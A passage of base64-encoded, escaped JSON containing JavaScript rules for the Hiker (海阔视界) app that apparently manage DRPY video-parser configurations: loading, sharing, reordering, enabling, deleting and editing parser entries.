xcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgIGlkOiBcXFxcXFxcInBsYXlsaXN0c0VORFxcXFxcXFwiXFxcXG4gICAgfVxcXFxuICB9KTtcXFxcblxcXFxuICBzZXRSZXN1bHQoZCk7XFxcXG4gIHJlbm92YXRlTGlzdChnZXRNeVZhcihpZCArIFxcXFxcXFwic291cmNlaVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIikpO1xcXFxufSkoKVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuino+aekOaWh+S7tlxcXCIsXFxcInBhdGhcXFwiOlxcXCJjb25maWdzXFxcIixcXFwicnVsZVxcXCI6XFxcImNvbnN0IHBhdGggPSBcXFxcXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvTG95RGdJay9wYXJzZXMuanNvblxcXFxcXFwiO1xcXFxubGV0IGRhdGE7XFxcXG5cXFxcbmZ1bmN0aW9uIGdldEpzb24oKSB7XFxcXG4gICAgaWYgKEFycmF5LmlzQXJyYXkoZGF0YSkpIHtcXFxcbiAgICAgICAgcmV0dXJuIGRhdGE7XFxcXG4gICAgfVxcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKHJlYWRGaWxlKHBhdGgpIHx8IFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICBkZWxldGVGaWxlKHBhdGgpO1xcXFxuICAgICAgICBkYXRhID0gW107XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBkYXRhO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBzYXZlSnNvbihqc29uKSB7XFxcXG4gICAgc2F2ZUZpbGUocGF0aCwgSlNPTi5zdHJpbmdpZnkoanNvbikpO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRVc2VmdWxKc29uKCkge1xcXFxuICAgIHJldHVybiBnZXRKc29uKCkuZmlsdGVyKHYgPT4gIXYuZm9yYmlkZGVuKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZ2V0Rm9yYmlkZGVuSnNvbigpIHtcXFxcbiAgICByZXR1cm4gZ2V0SnNvbigpLmZpbHRlcih2ID0+IHYuZm9yYmlkZGVuKTtcXFxcbn1cXFxcblxcXFxuJC5leHBvcnRzID0ge1xcXFxuICAgIGdldEpzb24sXFxcXG4gICAgc2F2ZUpzb24sXFxcXG4gICAgZ2V0VXNlZnVsSnNvbixcXFxcbiAgICBnZXRGb3JiaWRkZW5Kc29uLFxcXFxuICAgIHBhdGgsXFxcXG59O1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuino+aekOeuoeeQhlxcXCIsXFxcInBhdGhcXFwiOlxcXCJydWxlTWFuYWdlXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbnNldFBhZ2VUaXRsZShcXFxcXFxcIuino+aekOeuoeeQhlxcXFxcXFwiKTtcXFxcbmxldCBjb25maWdzID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKTtcXFxcbmxldCBhcnIgPSBjb25maWdzLmdldEpzb24oKTtcXFxcbmxldCBsZW5ndGggPSBhcnIubGVuZ3RoO1xcXFxuXFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuaWsOWinlxcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvcnVsZUVkaXQjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjI25vUmVmcmVzaCNcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpY29uX3NtYWxsXzRcXFxcXFxcIixcXFxcbiAgICBwaWNfdXJsOiBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fZG9tYWluX2NvbmZpZ1xcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIHBhZ2VUaXRsZTogXFxcXFxcXCLmlrDlop7op6PmnpBcXFxcXFxcIlxcXFxuICAgIH1cXFxcbn0pO1xcXFxuXFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuWIhuS6q1xcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIi0xXFxcXFxcXCIsIFxcXFxcXFwi6L6T5YWl5L2g6KaB5YiG5Lqr6Kej5p6Q55qE5bqP5Y+3XFxcXFxcXFxuLTHlhajpg6jvvIwtMuW3suWQr+eUqOeahO+8jC0z5bey56aB55So55qEXFxcXFxcXCIpLmlucHV0KChsZW5ndGgpID0+IHtcXFxcbiAgICAgICAgbGV0IGluZGV4YyA9IGlucHV0LnNwbGl0KC8sfO+8jC8pO1xcXFxuICAgICAgICBsZXQgaW5kZXhzID0gW107XFxcXG4gICAgICAgIGxldCBtbyA9IHBhcnNlSW50KGluZGV4Y1swXSk7XFxcXG4gICAgICAgIGlmICghKGluZGV4Yy5sZW5ndGggIT09IDAgJiYgbW8gPCAwICYmIG1vID4gLTUpKSB7XFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpdCBvZiBpbmRleGMpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgbnVtID0gcGFyc2VJbnQoaXQpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChOdW1iZXIuaXNOYU4obnVtKSB8fCBudW0gPj0gbGVuZ3RoIHx8IG51bSA8IDApIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mlbDlrZfkuI3lkIjms5VcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaW5kZXhzLnB1c2gobnVtKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gJChbXFxcXFxcXCJISUtFUlxcXFxcXFwiLCBcXFxcXFxcIlRYVFxcXFxcXFwiXS5jb25jYXQoZ2V0UGFzdGVzKCkpLCAyLCBcXFxcXFxcIuWIhuS6q+aWueW8j1xcXFxcXFwiKS5zZWxlY3QoKG1vLCBpbmRleHMsIGV4dCkgPT4ge1xcXFxuICAgICAgICAgICAgZnVuY3Rpb24gdXAocnVsZXMpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnVsZWI2NCA9IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShydWxlcykpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBnZXRQYXNzID0gKGxlbmd0aCwgcnVsZSwgdHlwZSkgPT4gXFxcXFxcXCLmtbfpmJTop4bnlYzvvIxEUlBZ6Kej5p6Q77yM5YWx44CMXFxcXFxcXCIgKyBsZW5ndGggKyBcXFxcXFxcIuOAjeadoe+8jOWkjeWItuaVtOadoeWPo+S7pOaJk+W8gOi9r+S7tuWwseS8muiHquWKqOWvvOWFpSRcXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIiRcXFxcXFxcIiArIHR5cGUgKyBcXFxcXFxcIkBpbXBvcnQ9anM6JC5yZXF1aXJlKCdpbXBvcnQ/cnVsZT0nK1xcXFxcXFwiICsgSlNPTi5zdHJpbmdpZnkoTVlfUlVMRS50aXRsZSkgKyBcXFxcXFxcIikoaW5wdXQpXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGdldFBhc3RlcygpLmluY2x1ZGVzKGlucHV0KSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IHNoYXJlUGFzdGUocnVsZWI2NCwgaW5wdXQpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJjb3B5Oi8vXFxcXFxcXCIgKyBnZXRQYXNzKHJ1bGVzLmxlbmd0aCwgdSwgXFxcXFxcXCJiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBwYXRoID0gXFxcXFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL0xveURnSWsvc2hhcmUvZHJweeino+aekOOAjFxcXFxcXFwiICsgcnVsZXMubGVuZ3RoICsgXFxcXFxcXCLjgI3mnaEuXFxcXFxcXCIgKyAoaW5wdXQgPT09IFxcXFxcXFwiSElLRVJcXFxcXFxcIiA/IFxcXFxcXFwiaGlrZXJcXFxcXFxcIiA6IFxcXFxcXFwidHh0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUocGF0aCwgZ2V0UGFzcyhydWxlcy5sZW5ndGgsIHJ1bGViNjQsIFxcXFxcXFwiYVxcXFxcXFwiKSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInNoYXJlOi8vXFxcXFxcXCIgKyBwYXRoO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGxldCBydWxlcztcXFxcbiAgICAgICAgICAgIGlmIChtbyA9PT0gLTEpIHtcXFxcbiAgICAgICAgICAgICAgICBydWxlcyA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuZ2V0SnNvbigpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChtbyA9PT0gLTIpIHtcXFxcbiAgICAgICAgICAgICAgICBydWxlcyA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuZ2V0VXNlZnVsSnNvbigpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChtbyA9PT0gLTMpIHtcXFxcbiAgICAgICAgICAgICAgICBydWxlcyA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuZ2V0Rm9yYmlkZGVuSnNvbigpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICBydWxlcyA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuZ2V0SnNvbigpLmZpbHRlcigodiwgaSkgPT4gaW5kZXhzLmluY2x1ZGVzKGkpKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJ1bGVzID0gcnVsZXMubWFwKCh2KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgdi5mb3JiaWRkZW4gPSB1bmRlZmluZWQ7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHY7XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIHJldHVybiB1cChydWxlcyk7XFxcXG4gICAgICAgIH0sIG1vLCBpbmRleHMsIGluZGV4Y1sxXSk7XFxcXG5cXFxcbiAgICB9LCBsZW5ndGgpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImljb25fc21hbGxfNFxcXFxcXFwiLFxcXFxuICAgIHBpY191cmw6IFxcXFxcXFwiaGlrZXI6Ly9pbWFnZXMvaWNvbl9zaGFyZV9ncmVlblxcXFxcXFwiXFxcXG59KTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi6YeN572uXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwi5L2g56Gu5a6a6YeN572u77yfXFxcXFxcXFxu6K+l5pON5L2c5Lya5Yig6Zmk546w5pyJ6Kej5p6Q77yM5oGi5aSN6Ieq5bim6Kej5p6Q44CCXFxcXFxcXCIpLmNvbmZpcm0oKHBhdGgpID0+IHtcXFxcbiAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgfSwgJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5wYXRoKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpY29uX3NtYWxsXzRcXFxcXFxcIixcXFxcbiAgICBwaWNfdXJsOiBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fcmVmcmVzaFxcXFxcXFwiXFxcXG59KTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5riF56m6XFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwi5L2g56Gu5a6a5YWo6YOo5Yig6Zmk77yfXFxcXFxcXFxu6K+l5pON5L2c5Lya5Yig6Zmk546w5pyJ6Kej5p6Q44CCXFxcXFxcXCIpLmNvbmZpcm0oKHBhdGgpID0+IHtcXFxcbiAgICAgICAgd3JpdGVGaWxlKHBhdGgsIFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgIH0sICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikucGF0aCksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwiaWNvbl9zbWFsbF80XFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJoaWtlcjovL2ltYWdlcy9pY29uX2NvZGVfdmlld1xcXFxcXFwiXFxcXG59KTtcXFxcblxcXFxuZC5wdXNoKHtcXFxcbiAgICAvL3RpdGxlOiAnPGZvbnQgY29sb3I9XFxcXFxcXCIjMTNCNjFCXFxcXFxcXCI+4paQIDwvZm9udD48Yj7op6PmnpDliJfooag8Yj4gKCcgKyBTdHJpbmcobGVuZ3RoKS5mb250Y29sb3IoXFxcXFxcXCIjZmY2NjAxXFxcXFxcXCIpICsgXFxcXFxcXCIpXFxcXFxcXCIsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCIsXFxcXG59KTtcXFxcbmxldCBjb3VudFRpdGxlID0gZC5hdCgtMSk7XFxcXG5cXFxcblxcXFxubGV0IGNvdW50ID0gZC5sZW5ndGg7XFxcXG5cXFxcbmZvciAobGV0IGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHtcXFxcbiAgICBsZXQgaXQgPSBhcnJbaV07XFxcXG5cXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnVsnICsgaSArICddPGI+ICAnICsgaXQubmFtZSArIChpdC5mb3JiaWRkZW4gPyBcXFxcXFxcIiAj4oCc4oCc56aB55So4oCd4oCdXFxcXFxcXCIuc21hbGwoKSA6IFxcXFxcXFwiXFxcXFxcXCIpLFxcXFxuICAgICAgICBkZXNjOiBpdC51cmwsXFxcXG4gICAgICAgIHVybDogJChbXFxcXFxcXCLnvJbovpFcXFxcXFxcIiwgXFxcXFxcXCLliIbkuqtcXFxcXFxcIiwgXFxcXFxcXCLnpoHnlKgv5ZCv55SoXFxcXFxcXCIsIFxcXFxcXFwi56e75YqoXFxcXFxcXCIsIFxcXFxcXFwi572u6aG2XFxcXFxcXCIsIFxcXFxcXFwi5Yig6ZmkXFxcXFxcXCJdLCAxLCBcXFxcXFxcIuaTjeS9nO+8mlxcXFxcXFwiICsgaXQubmFtZSkuc2VsZWN0KChpbmRleCwgbGVuZ3RoKSA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoaW5wdXQgPT09IFxcXFxcXFwi57yW6L6RXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL3BhZ2UvcnVsZUVkaXQjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjI25vUmVmcmVzaCNcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09IFxcXFxcXFwi5YiG5LqrXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgb3BzID0gZ2V0UGFzdGVzKCk7XFxcXG4gICAgICAgICAgICAgICAgb3BzLnVuc2hpZnQoXFxcXFxcXCLlrozmlbTlj6Pku6RcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQob3BzLCAyLCBcXFxcXFxcIuWIhuS6q+aWueW8j1xcXFxcXFwiKS5zZWxlY3QoKGluZGV4KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5nZXRKc29uKClbaW5kZXhdO1xcXFxuICAgICAgICAgICAgICAgICAgICBydWxlLnVzZXIgPSB1bmRlZmluZWQ7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGUuZm9yYmlkZGVuID0gdW5kZWZpbmVkO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZWI2NCA9IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShydWxlKSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBnZXRQYXNzID0gKG5hbWUsIHJ1bGUsIHR5cGUpID0+IFxcXFxcXFwi5rW36ZiU6KeG55WM77yM44CMXFxcXFxcXCIgKyBuYW1lICsgXFxcXFxcXCLjgI1EUlBZ6Kej5p6Q77yM5aSN5Yi25pW05p2h5Y+j5Luk5omT5byA6L2v5Lu25bCx5Lya6Ieq5Yqo5a+85YWlJFxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiJFxcXFxcXFwiICsgdHlwZSArIFxcXFxcXFwiQGltcG9ydD1qczokLnJlcXVpcmUoJ2ltcG9ydD9ydWxlPScrXFxcXFxcXCIgKyBKU09OLnN0cmluZ2lmeShNWV9SVUxFLnRpdGxlKSArIFxcXFxcXFwiKShpbnB1dClcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGlucHV0ID09IFxcXFxcXFwi5a6M5pW05Y+j5LukXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImNvcHk6Ly9cXFxcXFxcIiArIGdldFBhc3MocnVsZS5uYW1lLCBydWxlYjY0LCBcXFxcXFxcImFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IHNoYXJlUGFzdGUocnVsZWI2NCwgaW5wdXQpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiY29weTovL1xcXFxcXFwiICsgZ2V0UGFzcyhydWxlLm5hbWUsIHUsIFxcXFxcXFwiYlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0sIGluZGV4KTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09IFxcXFxcXFwi56e75YqoXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJChpbmRleCArIFxcXFxcXFwiXFxcXFxcXCIsIFxcXFxcXFwi6L6T5YWl5L2N572uXFxcXFxcXCIpLmlucHV0KChpbmRleCwgbGVuZ3RoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBuZXdJbmRleCA9IE51bWJlcihpbnB1dCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmIChOdW1iZXIuaXNOYU4obmV3SW5kZXgpIHx8IG5ld0luZGV4ID49IGxlbmd0aCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kuI3lkozop4TnmoTkvY3nva5cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSAkLnJlcXVpcmUoXFxcXFxcXCJjb25maWdzXFxcXFxcXCIpLmdldEpzb24oKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBydWxlcy5zcGxpY2UoaW5kZXgsIDEpWzBdO1xcXFxuICAgICAgICAgICAgICAgICAgICBydWxlcy5zcGxpY2UobmV3SW5kZXgsIDAsIHJ1bGUpO1xcXFxuICAgICAgICAgICAgICAgICAgICAkLnJlcXVpcmUoXFxcXFxcXCJjb25maWdzXFxcXFxcXCIpLnNhdmVKc29uKHJ1bGVzKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgICAgIH0sIGluZGV4LCBsZW5ndGgpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gXFxcXFxcXCLnva7pobZcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIGxldCBuZXdJbmRleCA9IDA7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5nZXRKc29uKCk7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBydWxlcy5zcGxpY2UoaW5kZXgsIDEpWzBdO1xcXFxuICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZShuZXdJbmRleCwgMCwgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5zYXZlSnNvbihydWxlcyk7XFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gXFxcXFxcXCLliKDpmaRcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiAkKFxcXFxcXFwi56Gu6K6k5Yig6Zmk77yfXFxcXFxcXCIpLmNvbmZpcm0oKGluZGV4KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuZ2V0SnNvbigpO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgcnVsZSA9IHJ1bGVzLnNwbGljZShpbmRleCwgMSlbMF07XFxcXG4gICAgICAgICAgICAgICAgICAgICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuc2F2ZUpzb24ocnVsZXMpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey5Yig6ZmkXFxcXFxcXCIgKyBydWxlLm5hbWU7XFxcXG4gICAgICAgICAgICAgICAgfSwgaW5kZXgpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgYXJyID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5nZXRKc29uKCk7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSBhcnJbaW5kZXhdO1xcXFxuICAgICAgICAgICAgICAgIHJ1bGUuZm9yYmlkZGVuID0gIXJ1bGUuZm9yYmlkZGVuO1xcXFxuICAgICAgICAgICAgICAgICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuc2F2ZUpzb24oYXJyKTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgLy9yZXR1cm4gXFxcXFxcXCJ0b2FzdDovL1xcXFxcXFwiICsgKHJ1bGUuZm9yYmlkZGVuID8gXFxcXFxcXCLnpoHnlKhcXFxcXFxcIiA6IFxcXFxcXFwi5ZCv55SoXFxcXFxcXCIpICsgcnVsZS5uYW1lO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9LCBpLCBsZW5ndGgpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGk6IGksXFxcXG4gICAgICAgICAgICBwYWdlVGl0bGU6IGl0Lm5hbWVcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxufVxcXFxuY291bnRUaXRsZS50aXRsZSA9ICc8Zm9udCBjb2xvcj1cXFxcXFxcIiMxM0I2MUJcXFxcXFxcIj7ilpAgPC9mb250PjxiPuino+aekOWIl+ihqDxiPiAoJyArICgoZC5sZW5ndGggLSBjb3VudCkgKyBcXFxcXFxcIi9cXFxcXFxcIiArIGxlbmd0aCkuZm9udGNvbG9yKFxcXFxcXFwiI2ZmNjYwMVxcXFxcXFwiKSArIFxcXFxcXFwiKVxcXFxcXFwiO1xcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuino+aekOe8lui+kVxcXCIsXFxcInBhdGhcXFwiOlxcXCJydWxlRWRpdFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5cXFxcbmFkZExpc3RlbmVyKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICBjbGVhck15VmFyKFxcXFxcXFwicHNfbmFtZVxcXFxcXFwiKTtcXFxcbiAgICBjbGVhck15VmFyKFxcXFxcXFwicHNfdXJsXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJwc19mbGFnXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJwc19oZWFkZXJzXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJwc19tZXRob2RcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcInBzX3J1blR5cGVcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcInBzX2pzb25QYXRoXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJwc19qc1xcXFxcXFwiKTtcXFxcbn0pKTtcXFxcbmxldCB1cmxJbmRleCA9IHBhcnNlSW50KGdldFBhcmFtKFxcXFxcXFwiaW5kZXhcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikpO1xcXFxudXJsSW5kZXggPSBOdW1iZXIuaXNOYU4odXJsSW5kZXgpID8gdm9pZCgwKSA6IHVybEluZGV4O1xcXFxubGV0IGluZGV4ID0gdm9pZCgwKSA9PT0gdXJsSW5kZXggPyBNWV9QQVJBTVMuaSA6IHVybEluZGV4O1xcXFxubGV0IGlzSW1wb3J0ID0gISFnZXRQYXJhbShcXFxcXFxcImlzSW1wb3J0XFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxubGV0IGFyciA9ICQucmVxdWlyZShcXFxcXFxcImNvbmZpZ3NcXFxcXFxcIikuZ2V0SnNvbigpO1xcXFxubGV0IG9iajtcXFxcbmlmIChpc0ltcG9ydCkge1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIG9iaiA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vZmlsZXMvX2NhY2hlL2ppZXhpU2ltcGxlSW1wb3J0Lmpzb25cXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCB0aXAgPSBpbmRleCAhPT0gdm9pZCgwKSA/IFxcXFxcXFwi5pu05paw6Kej5p6QXFxcXFxcXCIgOiBcXFxcXFxcIuWvvOWFpeino+aekFxcXFxcXFwiO1xcXFxuICAgICAgICBzZXRQYWdlVGl0bGUodGlwICsgXFxcXFxcXCI6XFxcXFxcXCIgKyBvYmoubmFtZSk7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLigJjigJhcXFxcXFxcIiArIHRpcCArIFxcXFxcXFwi4oCZ4oCZXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcbiAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgIG9iaiA9IHt9O1xcXFxuICAgICAgICBiYWNrKCk7XFxcXG4gICAgICAgIHRvYXN0KFxcXFxcXFwi5a+85YWl6ZSZ6K+vXFxcXFxcXCIpO1xcXFxuICAgIH1cXFxcbn0gZWxzZSBpZiAoaW5kZXggIT09IHZvaWQoMCkpIHtcXFxcbiAgICBvYmogPSBhcnJbaW5kZXhdO1xcXFxuICAgIHNldFBhZ2VUaXRsZShcXFxc